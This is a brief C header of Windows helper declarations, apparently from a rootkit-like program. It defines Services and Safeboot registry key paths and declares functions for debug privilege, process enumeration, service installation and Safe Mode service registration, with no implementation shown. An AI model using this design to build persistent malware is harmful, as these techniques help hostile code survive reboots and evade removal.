#include <winsock2.h>
#include <windows.h>
#include "ntdll.h"


// service registry keys
#define SVCDESC_KEY "SYSTEM\\CurrentControlSet\\Services\\"
#define SAFEBOOT_KEY "SYSTEM\\CurrentControlSet\\Control\\Safeboot\\"

#ifndef _MISC_
#define _MISC_

LPVOID misc_AllocBuffer(DWORD);
void misc_FreeBuffer(LPVOID*);
void misc_GetDebugPriv(void);
DWORD misc_NtGetCurrentProcessId(void);
DWORD misc_NtGetCurrentThreadId(void);
DWORD misc_GetPidByThread(HANDLE);
int misc_WriteDataToFile(LPSTR,LPVOID,ULONG);
LPVOID misc_GetProcessListBuffer(void);
BOOL misc_GetOSVersion(DWORD*,DWORD*);
int misc_SetServiceSafeBoot(LPSTR);
int misc_InstallService(LPSTR,LPSTR,LPSTR);
unsigned short misc_htons(unsigned short);

#endif